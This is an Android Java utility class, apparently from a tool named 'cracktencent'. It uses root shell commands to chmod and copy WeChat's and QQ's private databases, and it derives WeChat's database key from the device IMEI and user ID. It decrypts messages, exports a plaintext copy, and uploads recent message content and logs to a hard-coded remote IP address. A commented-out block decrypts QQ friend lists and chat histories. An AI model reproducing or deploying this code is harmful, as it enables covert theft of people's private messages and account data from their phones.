package com.moxi.wechatpay.getdb;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.util.Xml;
import android.widget.Toast;

import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import static android.content.ContentValues.TAG;


public class Utils {

    private static String[] binaryPaths = new String[]{"/system/bin/", "/system/xbin/"};
    private static String savePath = "/mnt/sdcard/cracktencent/";
    private static String qqSavePath = savePath + "qq/";
    private static String weixinSavePath = savePath + "weixin/";
    public static SharedPreferences sharedPreferences;
    private static String contenth;
    private static String logstr = "";


    public static void init(Context context) {

        sharedPreferences = context.getSharedPreferences("Utils", Context.MODE_PRIVATE);
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            sharedPreferences.edit().putString("IMEI", telephonyManager.getImei()).apply();
        }else{
            sharedPreferences.edit().putString("IMEI", telephonyManager.getDeviceId()).apply();
        }
        SQLiteDatabase.loadLibs(context);
        ArrayList<String> commands = new ArrayList<>();
        commands.add("cd /mnt/sdcard/");
        commands.add("mkdir cracktencent");
        commands.add("cd cracktencent");
        commands.add("mkdir qq");
        commands.add("mkdir weixin");
        runSu(commands);
    }

    public static void copyDatabase(Context context) {
        String QQDbPath = "/data/data/com.tencent.mobileqq/databases";
        File file = new File(QQDbPath);
        ArrayList<String> commands = new ArrayList<>();
        commands.add("chmod 777 " + QQDbPath +" -R");
        Utils.runSu(commands);
        commands.clear();
        File[] files = file.listFiles();
//        for (File f : files) {
//            if (!f.isDirectory()) {
//                String fileName = f.getName();
//                String[] fileNameSplit = fileName.split("\\.");
//                if (fileNameSplit.length > 0 && fileNameSplit[fileNameSplit.length - 1].equals("db")) {
//                    Pattern pattern = Pattern.compile("[0-9]*");
//                    if (pattern.matcher(fileName.substring(0, fileName.lastIndexOf("."))).matches()) {
//                        commands.add("chmod 777 " + f.getPath());
//                        Utils.runSu(commands);
//                        commands.clear();
//                        if (Utils.findBinary("busybox")) {
//                            commands.add("busybox cp -r " + f.getPath() + " " + qqSavePath + fileName);
//                        } else {
//                            commands.add("dd if=" + f.getPath() + " of=" + qqSavePath + fileName);
//                        }
//                        Utils.runSu(commands);
//                        commands.clear();
//                        android.database.sqlite.SQLiteDatabase database = android.database.sqlite.SQLiteDatabase.openDatabase(qqSavePath + fileName, null, 0);
//                        android.database.Cursor cursor = database.query("Groups", null, null, null, null, null, null);
//                        while (cursor.moveToNext()) {
//                            int group_id = cursor.getInt(cursor.getColumnIndex("group_id"));
//                            int group_count = cursor.getInt(cursor.getColumnIndex("group_friend_count"));
//                            String en_group_name = cursor.getString(cursor.getColumnIndex("group_name"));
//                            String de_group_name = Utils.decrypt(en_group_name);
//                            Log.i("TAG", "分组id：" + group_id + "，分组名解密为: " + de_group_name + "，分组成员数：" + group_count);
//                        }
//                        cursor.close();
//                        cursor = database.query("Friends", null, null, null, null, null, null);
//                        ArrayList<String> friendList = new ArrayList<>();
//                        while (cursor.moveToNext()) {
//                            String en_uin = cursor.getString(cursor.getColumnIndex("uin"));
//                            String de_uin = Utils.decrypt(en_uin);
//                            Log.i("TAG", "uin: " + de_uin);
//                            friendList.add(de_uin);
//
//                            String en_name = cursor.getString(cursor.getColumnIndex("name"));
//                            String de_name = Utils.decrypt(en_name);
//                            Log.i("TAG", "name: " + de_name);
//
//                            String en_remark = cursor.getString(cursor.getColumnIndex("remark"));
//                            String de_remark = Utils.decrypt(en_remark);
//                            Log.i("TAG", "remark: " + de_remark);
//
//                            byte[] en = cursor.getBlob(cursor.getColumnIndex("richBuffer"));
//                            String de = Utils.decrypt(en);
//                            Log.i("TAG", "richBuffer解密为: " + de);
//
//                            int group_id = cursor.getInt(cursor.getColumnIndex("groupid"));
//                            if (group_id != -1) {
//                                Log.i("TAG", "默认分组");
//                            }
//                        }
//                        cursor.close();
//
//                        //去掉本人
//                        friendList.remove(fileNameSplit[0]);
//
//                        for (String friend : friendList) {
//                            String table = "mr_friend_" + Utils.MD5(friend).toUpperCase() + "_New";
//                            Log.i("TAG", friend + " 表名：" + table);
//                            try {
//                                cursor = database.query(table, null, null, null, null, null, null);
//                            } catch (Exception e) {
//                                continue;
//                            }
//                            while (cursor.moveToNext()) {
//                                String en_senderuin = cursor.getString(cursor.getColumnIndex("senderuin"));
//                                String de_senderuin = Utils.decrypt(en_senderuin);
//                                Log.i("TAG", "senderuin解密为: " + de_senderuin);
//
//                                byte[] en = cursor.getBlob(cursor.getColumnIndex("msgData"));
//                                String de = Utils.decrypt(en);
//                                Log.i("TAG", "msgData解密为:" + de);
//
//                                String time = cursor.getString(cursor.getColumnIndex("time"));
//                                Log.i("TAG", "发送时间:" + time);
//                            }
//                            cursor.close();
//                        }
//                        database.close();
//                    }
//                }
//            }
//        }

        String weixinDbPath = "/data/data/com.tencent.mm/MicroMsg";
        String weixinSp = "/data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml";
        String crackSp = "/data/data/name.caiyao.cracktencent/shared_prefs/system_config_prefs.xml";
        commands.add("chmod 777 " + weixinDbPath +" -R");
        if (Utils.findBinary("busybox")) {
            commands.add("busybox cp -r " + weixinSp + " " + crackSp);
        } else {
            commands.add("cat " + weixinSp + " > " + crackSp);
        }
        commands.add("chmod 777 " + crackSp);
        Utils.runSu(commands);
        commands.clear();
        SharedPreferences sp = context.getSharedPreferences(
                "system_config_prefs", 0);
        String str = String.valueOf(sp.getInt("default_uin", 0));
//        str ="-833076470";
//        str = "0";
        if (str.equals("0")) {
            Log.i("TAG", "通过sharepreference获取uin失败");
            logstr = logstr+"通过sharepreference获取uin失败\n";
            if (Utils.findBinary("busybox")) {
                commands.add("busybox cp -r " + weixinSp + " " + weixinSavePath + "/uin.xml");
            } else {
                commands.add("cat " + weixinSp + " > " + weixinSavePath + "/uin.xml");
            }
            Utils.runSu(commands);
            commands.clear();
            str = getUin(weixinSavePath + "/uin.xml");
            if (str.equals("")) {
                Log.i("TAG", "无法获取uin");
                logstr = logstr+"无法获取uin\n";
                return;
            }
        }
        Log.i("TAG", "weixin uin is :" + str);
        String key = sharedPreferences.getString("IMEI", "") + str;
        Log.i("TAG", "key:" + key);
        String keyRes = Utils.MD5(key).substring(0, 7);
        Log.i("TAG", "pwd:" + keyRes);

        File wcf = new File(weixinDbPath);
        files = wcf.listFiles();
        if (files == null)
            return;

        boolean isCopy = false;
        for (File f : files) {
            if (!isCopy){
                if (f.isDirectory() && (f.getName().length() == 32)) {
                    isCopy = true;
                    String dbPath = f.getAbsolutePath();
                    String infoDbPath = dbPath + "/EnMicroMsg.db";
                    File isdatabaseFile = context.getDatabasePath(infoDbPath);
                    Log.d("TAG", "isCopy: "+infoDbPath);
                    if (!isdatabaseFile.exists()){
                        isCopy = false;
                        Log.d("TAG", "isCopy: 数据库不存在");
                        logstr = logstr +"isCopy: 数据库不存在\n";
//                        continue;
                    }
                    //String infoDbPath = dbPath + "/SnsMicroMsg.db";
                    commands.add("chmod 777 " + infoDbPath);
                    if (Utils.findBinary("busybox")) {
                        commands.add("busybox cp -r " + infoDbPath + " " + weixinSavePath + "EnMicroMsg.db");
                    } else {
                        commands.add("dd if=" + infoDbPath + " of=" + weixinSavePath + "EnMicroMsg.db");
                    }
                    Utils.runSu(commands);
                    commands.clear();
                    if (new File(weixinSavePath + "EnMicroMsg.db").exists()) {
                        File databaseFile = context.getDatabasePath(weixinSavePath + "EnMicroMsg.db");
                        File deDatabaseFile = context.getDatabasePath(weixinSavePath + "de.db");
                        if (deDatabaseFile.exists()) {
                            deDatabaseFile.delete();
                        }
                        SQLiteDatabaseHook hook = new SQLiteDatabaseHook() {
                            public void preKey(SQLiteDatabase database) {
                            }

                            public void postKey(SQLiteDatabase database) {
                                database.rawExecSQL("PRAGMA cipher_migrate;");  //最关键的一句！！！
                            }
                        };
                        Log.d("TAG", "copyDatabase: "+databaseFile.exists());
                        Log.d("TAG", "keyRes: "+keyRes);
                        SQLiteDatabase database = null;
                        try {
                            Log.d("TAG", "打开databaseFile: " + infoDbPath);
                            database = SQLiteDatabase.openOrCreateDatabase(databaseFile, keyRes, null, hook);

                        } catch (Exception e) {
                            Log.d("TAG", "databaseFile:密码错误 " + infoDbPath);
                            logstr = logstr + "databaseFile:密码错误 " + infoDbPath+"\n";
                            isCopy = false;
                            if (databaseFile.exists()) {
                                databaseFile.delete();
                            }
                        }
                        try {
                            //获取当前时间戳
                            long timeStamp = System.currentTimeMillis();
                            Log.d("xxxxx", String.valueOf(timeStamp));

                                Log.d("DB", "Cursor");
                                Cursor c = database.rawQuery("select * from message where talker = 'gh_3dfda90e39d6' and ? - createTime < 60*60*1000 order by createTime desc", new String[]{String.valueOf(timeStamp)});
                                List<Map<String, Object>> cList = new ArrayList<>();
                                Map<String, Object> cmap = null;
                                while (c.moveToNext()) {
                                    long createTime = c.getLong(c.getColumnIndex("createTime"));
                                    int msgId = c.getInt(c.getColumnIndex("msgId"));
                                    String content = c.getString(c.getColumnIndex("content"));
                                    cmap = new HashMap<String, Object>();
                                    cmap.put("createTime", createTime);
                                    cmap.put("msgId", msgId);
                                    cmap.put("content", content);
                                    cList.add(cmap);
                                    Log.d("TAG","------------content"+content);
                                    Log.d("TAG","------------createTime"+createTime);
                                    Log.d("TAG","------------msgId"+msgId);
                                }
                                String content = GsonTools.createGsonString(cList);

                                postDBData(content);

                                c.close();
                                database.rawExecSQL(String.format("ATTACH DATABASE '%s' as plaintext KEY '';",
                                        weixinSavePath + "de.db"));
                                database.rawExecSQL("SELECT sqlcipher_export('plaintext');");
                                database.rawExecSQL("DETACH DATABASE plaintext;");
                                database.close();
                            } catch (Exception e) {
                                Log.d("DB", "Exception");
                                logstr = logstr + "Exception" + "\n";
                            }
                        }
                    }
                }

        }
        postLogcontent();
    }

    /**
     * 上传错误日志
     */
    private static void postLogcontent() {
        String url = "http://47.91.167.130:8032/appInterface/wechat/getLog.do ";
        OkHttpClient okHttpClient = new OkHttpClient();

        FormBody.Builder body = new FormBody.Builder();
        if (logstr == null || logstr.equals(""))
            return;
        body.add("log", logstr);
        Request request = new Request.Builder()
                .url(url)
                .post(body.build())
                .build();

        Call call = okHttpClient.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.d(TAG, "postLogFailure: "+e.getMessage());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Log.d(TAG, "postResponse: "+response.body().string());
            }
        });
    }

    /**
     * 上传一小时内数据
     * @param content
     */
    private static void postDBData(String content) {
        String url = "http://47.91.167.130:8032/appInterface/wechat/collectAll.do";
        OkHttpClient okHttpClient = new OkHttpClient();

        FormBody.Builder body = new FormBody.Builder();
        if (content == null || content.equals(""))
            return;
        body.add("content", content);
        Request request = new Request.Builder()
                .url(url)
                .post(body.build())
                .build();

        Call call = okHttpClient.newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.d(TAG, "getWeChatDBFailure: "+e.getMessage());
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                Log.d(TAG, "getWeChatDBResponse: "+response.body().string());
            }
        });
    }

    public static String getUin(String xmlPath) {
        XmlPullParser xmlPullParser = Xml.newPullParser();
        try {
            InputStream inputStream = new FileInputStream(xmlPath);
            xmlPullParser.setInput(inputStream, "utf-8");
            int eventType = xmlPullParser.getEventType();
            while (eventType != XmlPullParser.END_DOCUMENT) {
                String getName = xmlPullParser.getName();
                if ("int".equals(getName)) {
                    Log.i("TAG","----------------name"+xmlPullParser.getAttributeValue(null, "name"));
                    if (("default_uin").equals(xmlPullParser.getAttributeValue(null, "name")))
                        return xmlPullParser.getAttributeValue(null, "value");
                }
                eventType =  xmlPullParser.next();

            }
        } catch (XmlPullParserException | IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    public static String decrypt(String s) {
        char[] imeiArr = sharedPreferences.getString("IMEI", "").toCharArray();
        int imeiLen = imeiArr.length;
        if (TextUtils.isEmpty(s)) {
            return "";
        }
        char[] enArr = s.toCharArray();
        int enLen = enArr.length;
        for (int i = 0; i < enLen; i++) {
            enArr[i] = (char) (enArr[i] ^ imeiArr[i % imeiLen]);
        }
        return new String(enArr);
    }

    public static String decrypt(byte[] bytes) {
        char[] imeiArr = sharedPreferences.getString("IMEI", "").toCharArray();
        int imeiLen = imeiArr.length;
        if (bytes == null) {
            return "";
        }
        for (int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte) (bytes[i] ^ imeiArr[i % imeiLen]);
        }
        return new String(bytes);
    }

    public static String MD5(String s) {
        try {
            MessageDigest md5 = MessageDigest.getInstance("MD5");
            md5.update(s.getBytes());
            int i;
            StringBuilder buf = new StringBuilder();
            byte[] b = md5.digest();
            for (byte aB : b) {
                i = aB;
                if (i < 0)
                    i += 256;
                if (i < 16)
                    buf.append("0");
                buf.append(Integer.toHexString(i));
            }
            return buf.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return "";
    }

    public static boolean runSu(ArrayList<String> commands) {
        BufferedOutputStream bufferedOutputStream = null;
        BufferedReader bufferedReader = null;
        try {
            Process process = Runtime.getRuntime().exec("su");
            bufferedOutputStream = new BufferedOutputStream(process.getOutputStream());
            bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            for (String command : commands) {
                Log.i("TAG", "command run:" + command);
                bufferedOutputStream.write((command + " 2>&1\n").getBytes());
            }
            bufferedOutputStream.write("exit\n".getBytes());
            bufferedOutputStream.flush();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                Log.i("TAG", "command out:" + line);
            }
            process.waitFor();
            return true;
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
            return false;
        } finally {
            try {
                if (bufferedOutputStream != null) {
                    bufferedOutputStream.close();
                }
                if (bufferedReader != null) {
                    bufferedReader.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public static boolean findBinary(String binaryName) {
        if (TextUtils.isEmpty(binaryName)) {
            for (String path : binaryPaths) {
                File file = new File(path + binaryName);
                if (file.exists())
                    return true;
            }
        }
        return false;
    }
}
